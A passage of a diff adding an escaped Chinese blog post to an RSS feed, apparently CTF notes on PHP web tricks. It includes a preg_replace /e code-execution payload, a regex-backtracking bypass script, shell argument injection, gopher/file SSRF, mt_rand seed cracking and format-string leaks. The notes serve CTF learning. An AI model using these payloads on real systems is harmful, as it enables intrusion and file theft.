class=&#34;hljs-variable&#34;&gt;%bf&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%02&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%28&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%f3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%8&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%42&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%75&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%93&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%49&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%67&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%a0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d1&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d5&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%83&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%60&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fb&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%07&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fe&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;br&gt;&lt;br&gt;二者的MD&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;值是相同的&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+
+
+&lt;h2 id=&#34;preg-replace&#34;&gt;&lt;a href=&#34;#preg-replace&#34; class=&#34;headerlink&#34; title=&#34;preg_replace&#34;&gt;&lt;/a&gt;preg_replace&lt;/h2&gt;&lt;hr&gt;
+&lt;figure class=&#34;highlight&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs&#34;&gt;使用数组传入，则正则表达式一定无法匹配到&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;/e漏洞&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;preg_replace(&lt;span class=&#34;hljs-string&#34;&gt;&#39;/(&#39;&lt;/span&gt;. &lt;span class=&#34;hljs-variable&#34;&gt;$regex&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&#39;)/ei&#39;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&#39;strtolower(&#34;\1&#34;)&#39;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;); &lt;span class=&#34;hljs-comment&#34;&gt;# 该函数的作用是将在第三个参数中根据第一个参数进行匹配，将匹配到的字符串使用第二个字符串进行替换、&lt;/span&gt;&lt;br&gt;启用\e模式后，则第二个参数会当做命令进行执行&lt;br&gt;https:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;xz.aliyun.com&lt;span class=&#34;hljs-regexp&#34;&gt;/t/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;2557&lt;/span&gt;&lt;br&gt;\S*=&lt;span class=&#34;hljs-variable&#34;&gt;${getflag()}&lt;/span&gt; 即可使getflag()被执行&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;单行匹配&#34;&gt;&lt;a href=&#34;#单行匹配&#34; class=&#34;headerlink&#34; title=&#34;单行匹配&#34;&gt;&lt;/a&gt;单行匹配&lt;/h3&gt;&lt;p&gt;如果传入的字符串中含有换行符，则会只匹配第一行看，可以使用%0A进行绕过&lt;/p&gt;
+&lt;h3 id=&#34;超长字符串绕过&#34;&gt;&lt;a href=&#34;#超长字符串绕过&#34; class=&#34;headerlink&#34; title=&#34;超长字符串绕过&#34;&gt;&lt;/a&gt;超长字符串绕过&lt;/h3&gt;&lt;p&gt;当输入的内容过长时 ，PHP为了防止出现DDOS攻击会限制正则表达式的回溯次数（默认回溯次数上限是一百万）&lt;/p&gt;
+&lt;p&gt;因此可以在Payload后添加超长的字符串，导致匹配结果为false从而绕过&lt;/p&gt;
+&lt;p&gt;例题：[FBCTF2019]RCEService&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;payload = &lt;span class=&#34;hljs-string&#34;&gt;&#39;{&#34;cmd&#34;:&#34;/bin/cat /home/rceservice/flag&#34;,&#34;test&#34;:&#34;&#39;&lt;/span&gt; + &lt;span class=&#34;hljs-string&#34;&gt;&#34;a&#34;&lt;/span&gt;*(&lt;span class=&#34;hljs-number&#34;&gt;1000000&lt;/span&gt;) + &lt;span class=&#34;hljs-string&#34;&gt;&#39;&#34;}&#39;&lt;/span&gt;&lt;br&gt;res = requests.post(&lt;span class=&#34;hljs-string&#34;&gt;&#34;http://434b3585-3396-4c38-8cd8-1a8425f7886a.node3.buuoj.cn/&#34;&lt;/span&gt;, data={&lt;span class=&#34;hljs-string&#34;&gt;&#34;cmd&#34;&lt;/span&gt;:payload})&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(res.text)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;escapeshellarg-escapeshellcmd&#34;&gt;&lt;a href=&#34;#escapeshellarg-escapeshellcmd&#34; class=&#34;headerlink&#34; title=&#34;escapeshellarg()+escapeshellcmd()&#34;&gt;&lt;/a&gt;escapeshellarg()+escapeshellcmd()&lt;/h2&gt;&lt;hr&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs shell&#34;&gt;传入的参数是：172.17.0.2&#39; -v -d a=1&lt;br&gt;经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。# 将单引号包裹成 &#39;\&#39;&#39;&lt;br&gt;经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php	&lt;br&gt;最后执行的命令是curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#39;，即向172.17.0.2\发起请求，POST 数据为a1&#39;。&lt;br&gt;&lt;br&gt;escapeshellcmd # 单纯的加上反斜杠转译&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;由于用户输入往往会被系统使用单引号括起来，则在payload中加入单引号，由于两个函数的连用，导致本来应该被转译的单引号出现逃逸&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/164/&#34;&gt;https://paper.seebug.org/164/&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;rand&#34;&gt;&lt;a href=&#34;#rand&#34; class=&#34;headerlink&#34; title=&#34;rand()&#34;&gt;&lt;/a&gt;rand()&lt;/h2&gt;&lt;hr&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 使用工具php_mt_seed-4.0&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;使用脚本&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$pass_now&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&#34;FpCyLNvPOj&#34;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$allowable_characters&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$length&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;strlen&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$allowable_characters&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$j&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$j&lt;/span&gt; &amp;lt; &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;strlen&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$pass_now&lt;/span&gt;); &lt;span class=&#34;hljs-variable&#34;&gt;$j&lt;/span&gt;++) {&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; &amp;lt; &lt;span class=&#34;hljs-variable&#34;&gt;$length&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;++) {&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$pass_now&lt;/span&gt;[&lt;span class=&#34;hljs-variable&#34;&gt;$j&lt;/span&gt;] == &lt;span class=&#34;hljs-variable&#34;&gt;$allowable_characters&lt;/span&gt;[&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;]) {&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;&lt;span class=&#34;hljs-subst&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;hljs-subst&#34;&gt;$i&lt;/span&gt; 0 &lt;span class=&#34;hljs-subst&#34;&gt;$length&lt;/span&gt; &#34;&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;&lt;br&gt;        }&lt;br&gt;    }&lt;br&gt;}&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# ./php_mt_seed-4.0 41 41 0 61 15 15 0 61 38 38 0 61 24 24 0 61 47 47 0 61 49 49 0 61 21 21 0 61 51 51 0 61 50 50 0 61 9 9 0 61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 即可跑出对应的种子&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;	&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;curl-exec&#34;&gt;&lt;a href=&#34;#curl-exec&#34; class=&#34;headerlink&#34; title=&#34;curl_exec&#34;&gt;&lt;/a&gt;curl_exec&lt;/h2&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;##漏洞代码如下&lt;/span&gt;&lt;br&gt;			&lt;span class=&#34;hljs-variable&#34;&gt;$ch&lt;/span&gt;=&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;curl_init&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$url&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;curl_setopt&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$ch&lt;/span&gt;, CURLOPT_HEADER, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;curl_setopt&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$ch&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;curl_exec&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$ch&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;curl_close&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$ch&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$result&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;## 利用方式&lt;/span&gt;&lt;br&gt;传入的url可以使用file协议进行文件的读取&lt;br&gt;传入gopher协议可以进行ssrf，将请求的get或者post数据包进行url编码进行传递&lt;br&gt;&lt;br&gt;url=gopher:&lt;span class=&#34;hljs-comment&#34;&gt;//127.0.0.1:80/_[Payload]&lt;/span&gt;&lt;br&gt;Payload 中的%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;a要使用%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;d%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;a进行传递    &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;PHP格式化字符串漏洞&#34;&gt;&lt;a href=&#34;#PHP格式化字符串漏洞&#34; class=&#34;headerlink&#34; title=&#34;PHP格式化字符串漏洞&#34;&gt;&lt;/a&gt;PHP格式化字符串漏洞&lt;/h2&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;##%1$s  ——  这种办法原理是%1$s会将第一个参数用string类型输出，而这道题中第一个参数便是admin.php的源码，语句是：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;sprintf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;&lt;span class=&#34;hljs-subst&#34;&gt;$url&lt;/span&gt; method&amp;amp;content_size:&#34;&lt;/span&gt;GET%&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;%d&lt;span class=&#34;hljs-string&#34;&gt;&#34;, &lt;span class=&#34;hljs-subst&#34;&gt;$detect&lt;/span&gt;));  ## %1&lt;span class=&#34;hljs-subst&#34;&gt;$s&lt;/span&gt;会以字符串格式输出&lt;span class=&#34;hljs-subst&#34;&gt;$detect&lt;/span&gt;，而%d会输出0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;##  %s%  ——  这种办法的原理是sprintf()函数中%可以转义掉%，这样语句就变成了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;print(sprintf(&#34;&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$url&lt;/span&gt; method&amp;amp;&lt;span class=&#34;hljs-attr&#34;&gt;content_size&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;GET%s%%d&#34;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$detect&lt;/span&gt;));  &lt;span class=&#34;hljs-comment&#34;&gt;// %d前的%被转义，因此失&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://alazymechnaic.github.io/2024/03/04/shu-xing-qian-ming-yu-men-xian/</guid>
             <title>属性签名与门限</title>
